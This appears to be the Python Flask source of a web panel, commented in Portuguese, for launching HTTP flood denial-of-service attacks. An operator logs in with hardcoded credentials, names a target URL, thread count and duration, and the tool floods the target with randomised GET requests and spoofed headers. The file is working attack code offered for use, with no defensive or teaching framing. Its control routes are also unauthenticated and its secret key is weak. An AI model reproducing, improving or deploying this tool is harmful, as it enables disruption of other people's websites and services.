from flask import Flask, render_template, request, redirect, url_for, session, jsonify
import threading
import requests
import random
import string
import datetime

app = Flask(__name__)
app.secret_key = 'segredo123'  # 🔥 Troca depois por algo forte!

# Login
USUARIO = 'admin'
SENHA = '1234'

# Variáveis de ataque
alvo = ""
threads = 0
rodando = False
lock = threading.Lock()

def gerar_payload(tamanho=2048):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=tamanho))

def gerar_headers():
    headers = {
        "User-Agent": random.choice([
            "Mozilla/5.0", "curl/7.68.0", "Wget/1.20.3"
        ]),
        "Referer": random.choice([
            "https://google.com", "https://bing.com"
        ]),
    }
    for _ in range(10):
        fake_key = "X-Fake-" + ''.join(random.choices(string.ascii_letters, k=5))
        fake_value = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        headers[fake_key] = fake_value
    return headers

def flood():
    global rodando
    while rodando:
        try:
            payload = gerar_payload()
            url = f"{alvo}/?q={payload}"
            headers = gerar_headers()
            requests.get(url, headers=headers, timeout=5)
        except:
            pass

def registrar_log(alvo, codigo):
    data = datetime.datetime.now().strftime('%d/%m/%Y %H:%M:%S')
    with open("logs.txt", "a") as f:
        f.write(f"URL:{alvo} DATA&HORA:{data} CÓDIGO:{codigo}\n")

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form['usuario'] == USUARIO and request.form['senha'] == SENHA:
            session['logado'] = True
            return redirect(url_for('painel'))
        else:
            return "Acesso negado."
    return '''
    <form method="post">
        <input type="text" name="usuario" placeholder="Usuário"><br>
        <input type="password" name="senha" placeholder="Senha"><br>
        <button type="submit">Entrar</button>
    </form>
    '''

@app.route('/painel')
def painel():
    if not session.get('logado'):
        return redirect('/')
    return render_template('index.html')

@app.route('/start', methods=['POST'])
def start():
    global alvo, threads, rodando

    if rodando:
        return jsonify({'status': 'erro', 'mensagem': '⚠️ Já está em execução!'})

    alvo = request.form.get('alvo')
    threads = int(request.form.get('threads'))
    tempo = int(request.form.get('tempo'))

    if threads > 500:
        return jsonify({'status': 'erro', 'mensagem': '❌ Máximo 500 threads!'})

    rodando = True
    codigo = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    registrar_log(alvo, codigo)

    for _ in range(threads):
        t = threading.Thread(target=flood)
        t.daemon = True
        t.start()

    timer = threading.Timer(tempo, parar_ataque)
    timer.start()

    return jsonify({'status': 'ok', 'mensagem': f'🚀 Ataque iniciou contra {alvo} por {tempo} segundos com {threads} threads. Código: {codigo}'})

@app.route('/stop', methods=['POST'])
def stop():
    if not rodando:
        return jsonify({'status': 'erro', 'mensagem': '⚠️ Nenhum ataque ativo.'})
    parar_ataque()
    return jsonify({'status': 'ok', 'mensagem': '🛑 Ataque parado.'})

def parar_ataque():
    global rodando
    rodando = False

@app.route('/logs')
def logs():
    if not session.get('logado'):
        return redirect('/')
    with open("logs.txt", "r") as f:
        conteudo = f.read().replace('\n', '<br>')
    return f"<h1>Logs:</h1><p>{conteudo}</p><a href='/painel'>Voltar</a>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
